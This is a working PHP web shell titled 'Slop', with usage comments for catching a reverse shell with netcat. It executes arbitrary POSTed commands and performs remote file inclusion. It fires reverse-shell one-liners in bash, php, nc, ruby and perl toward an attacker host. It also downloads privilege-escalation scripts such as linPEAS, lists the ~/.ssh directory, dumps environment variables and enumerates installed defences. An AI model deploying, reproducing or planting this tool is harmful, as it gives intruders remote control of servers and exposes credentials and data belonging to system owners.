<?php
/* 
to get a reverse shell simply execute the following 2 commands:


#1) To start your listener, execute this command: nc -nvlp 8099 
#2) To initiate the reverse conncetion from the server back to your local machine:
      clear;curl http://127.0.0.1:8099/sp.php --data "rcom=1&mthd=bash&host=&port=8099&shell=" -v

The result of the above post request to this script should produce something like this:
    
        Note: Unnecessary use of -X or --request, POST is already inferred.
        *   Trying 127.0.0.1...
        * TCP_NODELAY set
        * Connected to 127.0.0.1 (127.0.0.1) port 8099 (#0)
        > POST /sp.php HTTP/1.1
        > Host: 127.0.0.1:8099
        > User-Agent: curl/7.60.0
        > Content-Length: 39
        > Content-Type: application/x-www-form-urlencoded
        > 
        * upload completely sent off: 39 out of 39 bytes
        < HTTP/1.1 200 OK
        < Host: 127.0.0.1:8099
        < Date: Mon, 03 Aug 2020 22:30:09 +0000
        < Connection: close
        < X-Powered-By: PHP/7.2.5
        < Content-type: text/html; charset=UTF-8
        < 

        Host was empty, using: 127.0.0.1

        Shell was empty, using default: /bin/bash

        Attempting to connect back, ensure you have the listener running.

        Using: bash
        Rhost: 127.0.0.1
        Rport: 8099
        Lshell: /bin/bash

         Closing connection 0

*/
function b64($target, $how, $data, $ext, $dir)
{
    /*
        So, this isnt pretty, or elegant. Its designed to work, and the base64 -w0 works the best from what i have seen, makes the file much
        easier to transport across http/https, as it strips the newlines out of the end result.
    */
    if (!empty($how) && !empty($target) && !empty($dir)) {
        if (!empty($data) && $how == "up") {
            echo "Starting to decode base64";
            shell_exec("echo " . $data . "| base64 >> " . $dir . "/" . $target . "_backup." . $ext) || die("Error on upload.");
        } elseif ($how == "down" && !empty($data) && !empty($dir)) {
            echo "Starting base64 encoding";
            shell_exec("base64 -w0 " . $dir . "/" . $target . " >> " . getcwd() . $target . "_backup.b64") || die("Error on building the download.");
        } else {
            echo "Cannot do what you asked of me.";
        }
    }
}

function checkComs()
{
    $lincommands = array(
        "perl", 'python', 'php', 'mysql', 'pg_ctl', 'wget', 'curl', 'lynx', 'w3m', 'gcc', 'g++',
        'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox',
        'qemu', 'sudo', "git", "xterm", "tcl", "ruby", "postgres", "mongo", "couchdb",
        "cron", "anacron", "visudo", "mail", "postfix", "gawk", "base64", "uuid"
    );
    foreach ($lincommands as $item) {
        echo '<pre>' . shell_exec("which " . $item) . "</pre>";
    }
}

function parseProtections()
{
    $protections = array(
        "selinux", "iptables", "pfctl", "firewalld", "yast", "yast2", "fail2ban", "denyhost"
    );
    foreach ($protections as $prot) {
        echo '<pre>' . shell_exec("which " . $prot) . "</pre>";
    }
}

function checkShells()
{
    $shells = array("ksh", "csh", "zsh", "bash", "sh", "tcsh");
    foreach ($shells as $shell) {
        echo '<pre>' . shell_exec("which " . $shell) . "</pre>";
    }
}

function checkPack()
{
    $packs = array(
        "zypper", "yum", "pacman", "apt", "apt-get", "pkg", "pip", "pip2", "pip3", "gem", "cargo", "nuget", "ant", "emerge"
    );
    foreach ($packs as $pack) {
        echo '<pre>' . shell_exec("which " . $pack) . "</pre>";
    }
}

function cloner($repo, $os)
{
    $repos = array(

        "linux" => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
        "WinBAT" => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat",
        "WinEXEANY" => "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe",
        "default" => "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py"

    );

    $windefault = $repos["WinBAT"];
    $linDefault = $repo["linux"];
    if (!empty($repo)) {
        echo "<font style='background-color:white'>Git is ok, executing pull request on " . $repo . "</font>";
        shell_exec("git clone " . $repo) || die("Error.");
        echo "Cloned Repo: \n" . shell_exec("ls -lah .");
    } elseif ($os == "lin") {
        echo "Linux selected";
        shell_exec("curl " . $linDefault . "-o lin.sh; chmod +x ./lin.sh");
    } elseif ($os == "win") {
        echo "Win default selected.";
        shell_exec("curl.exe --output winbat.bat " . $windefault);
    } else {
        echo "assuming linux, since it was not specified.";
        shell_exec("curl " . $repos["default"] . " -o suid.py; chmod +x suid.py");
    }
}

function checkSystem()
{
    $os = array();
    if (substr(php_uname(), 0, 7) == 'Windows') {
        $iam = 'echo %USERNAME%';
        array_push($os, $iam, "Windows");
        return $os;
    } else {
        $iam = shell_exec("whoami");
        array_push($os, $iam, "Linux");
        return $os;
    }
}

function showEnv($os)
{
    if (!empty($os)) {
        if ($os[1] == 'Linux') {
            return shell_exec('env');
        } elseif ($os == "Windows") {
            return shell_exec("SET");
        } else {
            return null;
        }
    }
    return null;
}

function reverseConnections($methods, $host, $port, $shell)
{
//    $errorNum = error;
    $defaultPort = 1634;
    $defaultHost = $_SERVER["REMOTE_ADDR"];
    $defaultShell = "/bin/bash";

    $useHost = null;
    $usePort = null;
    $useShell = null;


    if (empty($host)) {
        echo "\nHost was empty, using: " . $defaultHost . "\n";
        $useHost = $defaultHost;
    } else {
        $useHost = $host;
    }
    if (empty($shell)) {
        echo "\nShell was empty, using default: " . $defaultShell . "\n";
        $useShell = $defaultShell;
    } else {
        $useShell = $shell;
    }
    if (empty($port)) {
        echo "\nPort was empty, using default: " . $defaultPort . "\n";
        $usePort = $defaultPort;
    } else {
        $usePort = $port;
    }
    $comma = array(
        "bash" => "nohup bash -i >& /dev/tcp/" . $useHost . "/" . $usePort . " 0>&1 &",
        "php" => "nohup php -r '\$sock=fsockopen(" . $useHost . "," . $usePort . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");' &",
        "nc" => "nohup nc -e " . $useShell . " " . $useHost . " " . $usePort . " &",
        "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nohup nc " . $useHost . " " . $usePort . " >/tmp/f &",
        "ruby" => "nohup ruby -rsocket -e'f=TCPSocket.open(" . $useHost . "," . $usePort . ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)' &",
        "perl" => "nohup perl -e 'use Socket;\$i=" . $useHost . ";\$p=" . $usePort . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' &",


    );
    $defaultAction = $comma["bash"];
    if (!empty($methods)) {
        echo "\nAttempting to connect back, ensure you have the listener running.\n";
        echo "\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n";

        shell_exec($comma[$methods]) || die("Something went wrong: ->" . error_get_last() . "\r\n\r\n\r\n");
    } else {
        echo "\nYou didnt specify a method to use, defaulting to bash.\n";
        echo "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n";
        shell_exec($defaultAction) || die("\nThere was an error at the connection\n->Error\n" . error_get_last() . "\r\n\r\n\r\n");
    }
}

function executeCommands($com)
{
    if (!empty($com)) {
        echo '<p style="padding:20px;margin:20px;background-color:white;"><b> ~ Info To Remember ~ </b></p><textarea cols="80" rows="10">' . shell_exec($com) . '</textarea>';
    }
}

function remoteFileInclude($targetFile)
{
    if (!empty($targetFile)) {
        include ($targetFile) || die("Could not remote import :(");
    }
}


if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST["commander"])) {
        executeCommands($_POST["commander"]);
    } elseif (!empty($_POST["clone"])) {
        if (!empty($_POST["ROS"])) {
            $ROS = $_POST["ROS"];
        } else {
            $ROS = "";
        }
        cloner($_POST["clone"], $ROS);
    } elseif (!empty($_POST["doInclude"])) {
        remoteFileInclude($_POST["doInclude"]);
    } elseif (!empty($_POST["b6"])) {
        echo "Future editions will have this.";
        //b64();
    } elseif ($_POST["rcom"]) {
        reverseConnections($_POST["mthd"], $_POST["host"], $_POST["port"], $_POST["shell"]);
    } else {
        echo "Empty post";
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <title>Slop</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            background-color: black;
        }

        .log {
            margin: 10px;
            background-color: aliceblue;
            text-decoration-color: white;
        }

        .slog {
            background-position: bottom;
            background-size: auto;
            margin: auto;
            padding: 50px;
            height: auto;
            width: auto;
            background-color: aliceblue;
            text-decoration-color: white;
            text-align: center;
            align-self: left;
        }

        #userInfo {
            width: auto;
            float: left;
            height: auto;
            background-color: dimgray;
            text-decoration-color: white;
        }

        nav {
            float: left;
            width: 30%;
            background: #ccc;
            padding: 20px;
        }

        section:after {
            content: "";
            display: table;
            clear: both;
        }

        nav ul {
            list-style-type: none;
            padding: 0;
        }

        #article-left {
            float: left;
            padding: 20px;
            width: 600px;
            height: 300px;
            overflow-x: scroll;
            overflow-y: scroll;
            background-color: #f1f1f1;
        }

        #article-right {
            float: right;
            padding: 20px;
            width: auto;
            background-color: #f1f1f1;
            height: auto;
        }

        #returned-center {
            float: right;
            text-align: center;
            position: relative;
            top: 475px;
            left: 1310px;
            height: 200px;
            width: 500px;
        }

        #returned {
            position: absolute;
            bottom: 0px;
            width: auto;
            background-color: #f1f1f1;
            height: auto;
        }

        #container-left {
            height: auto;
            width: auto;
        }

        #container-right {
            height: auto;
            width: auto;
        }

        .main_tool_label {
            margin: 10px;
            background-color: aliceblue;
            text-decoration-color: white;
            text-align: center;
            overflow: auto;
        }

        #container-mid {
            position: center;
            align-self: bottom;
            background-color: aliceblue;
            text-decoration-color: white;
        }

        .article-mid {
            padding: 20px;
            width: auto;
            background-color: #f1f1f1;
            height: auto;
        }
    </style>
</head>

<body>
<div id="container-mid">
    <div class="article-mid">
        <p><b>~ Safe mode? ~</b></p>
        <td>
            <tr><?=
                $safemode = ini_get('safe_mode');
                if ($safemode) {
                    echo "<p> <b>Safe Mode: </b><font color='red'>" . $safemode . "</font></p>";
                } else {
                    echo "<p> <b>Safe Mode is: </b><font style='text-color:green;background-color:lightgrey;'>off.</font></p>";
                }
                ?>
            </tr>
            <br>
        </td>
    </div>
</div>
<div id="container-left">
    <article id="article-left">
        <h1 class="main_tool_label">~ System info's ~</h1>
        <div>
            <?=
            $h = '';
            echo "<b>Can we reach it?</b>";
            if (checkdnsrr('github.com', 'ANY')) {
                echo "<p><font style='text-color: green;'>Github is Reachable!</font></p><form action='' method='post'><input type='text' name='clone'><input type='submit' value='Clone it!'></form>";
            } else {
                echo "<p><font style='text-color: red;'>Github is Not Reachable!</font></p>";
            }
            ?>
        </div>
        <div>
            <a>
                <b>Avail Commands:</b>
                <br>
                <br>
                <?= checkComs() ?>
                <br>
            </a>
        </div>
        <div>
            <a><b>Available Shells:</b><br><br>
                <?= checkShells() ?>
                <br></a>
        </div>
        <div>
            <a><b> Protections:</b><br><br>
                <?= parseProtections() ?>
                <br></a>
        </div>
        <div>
            <a><b> Package Managers: </b><br><br>
                <?= checkPack() ?>
                <br></a>
        </div>
        <div>
            <a><br><b>Sys/Env info:</b><br><br>
                <?= showEnv(checkSystem()) ?>
            </a>
        </div>
    </article>
</div>
<div id="divider">
</div>
<div id="container-right">
    <article id="article-right">
        <h1 class="main_tool_label">~ Commands ~</h1>
        <div>
            <?php
            $base = 'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami';
            executeCommands($base);
            ?>
            <a>
                <br>
                <b> ~ Execute ~ </b>
                <br>
            </a>
            <form method='post' action=''>
                <input type='text' name='commander' value=''>
                <input type='submit' value='Execute'></form>
        </div>
        <div>
            <a>
                <b>~ Remote or Local File Include ~ </b>
            </a>
            <br>
            <form method="post" action=''>
                <input type="text" name="doInclude">
                <input type="submit" value="Fetch it!">
            </form>

        </div>
    </article>
</div>
</body>

</html>
